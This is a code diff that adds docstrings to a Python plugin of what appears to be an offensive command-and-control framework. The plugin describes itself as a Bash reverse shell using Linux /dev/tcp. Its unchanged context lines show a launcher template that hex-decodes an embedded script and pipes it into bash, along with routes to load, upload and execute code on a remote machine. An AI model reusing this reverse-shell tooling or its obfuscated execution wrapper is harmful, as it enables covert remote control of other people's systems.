@@ -1,3 +1,5 @@
+"""Shell socket client plugin extension, runtime adapter, and asset processor."""
+
 import os
 from collections.abc import Mapping
 from pathlib import Path
@@ -23,10 +25,19 @@ class ShellSocketPlugin(contract.IPluginExtension[ShellSocketConfig]):
     """
 
     name = "shell_socket"
+    """Unique plugin identifier."""
+
     description = "Bash-based reverse shell using Linux /dev/tcp pseudo-devices."
+    """Human-readable plugin description."""
+
     version = "1.0.0"
+    """SemVer version string."""
+
     author = "github.com/othonhugo"
+    """Author identifier."""
+
     options_type = ShellSocketConfig
+    """Parsed options schema type."""
 
     routes = {
         config.OfficialRoute.LOAD.value: core.OFFICIAL_ROUTES[config.OfficialRoute.LOAD.value],
@@ -35,6 +46,7 @@ class ShellSocketPlugin(contract.IPluginExtension[ShellSocketConfig]):
         config.OfficialRoute.UPLOAD.value: core.OFFICIAL_ROUTES[config.OfficialRoute.UPLOAD.value],
         config.OfficialRoute.EXECUTE.value: core.OFFICIAL_ROUTES[config.OfficialRoute.EXECUTE.value],
     }
+    """Supported route table mappings."""
 
     supported_launcher_kinds: frozenset[config.LauncherKind] = frozenset(
         {
@@ -42,6 +54,7 @@ class ShellSocketPlugin(contract.IPluginExtension[ShellSocketConfig]):
             config.LauncherKind.STAGELESS,
         }
     )
+    """Set of supported launcher delivery kinds."""
 
     @classmethod
     def configure_parser(cls, parser: contract.IArgumentParser, /) -> None:
@@ -107,9 +120,14 @@ class ShellSocketRuntime(contract.IPluginRuntime):
     DEFAULT_WRAPPER_TEMPLATE: Final[str] = (
         """bash -c 'printf "%s" "$1" | while IFS= read -r -n2 byte; do printf "%b" "\\\\x$byte"; done | bash' _ '$DECLUSOR_SCRIPT'"""
     )
+    """Default shell invocation template for monolithic stageless launcher."""
+
     STAGED_WRAPPER_TEMPLATE: Final[str] = "bash -c '$DECLUSOR_SCRIPT'"
+    """Shell invocation template for lightweight staged loader."""
 
     def __init__(self, plugin_config: contract.PluginConfig[ShellSocketConfig], /) -> None:
+        """Initialize shell client runtime with active configuration, renderer, and processor."""
+
         self._plugin_config = plugin_config
         self._renderer = ShellSocketRenderer()
         self._expected_ack = util.hash_sha256(config.DEFAULT_CLIENT_ACK_SEED)
@@ -176,6 +194,8 @@ class ShellSocketProcessor(contract.IPluginProcessor):
         library_extensions: tuple[str, ...] = (".sh",),
         module_extensions: tuple[str, ...] = (".sh",),
     ) -> None:
+        """Initialize asset processor with filesystem paths and permitted extensions."""
+
         self._filesystem = filesystem
         self._library_extensions = library_extensions
         self._module_extensions = module_extensions
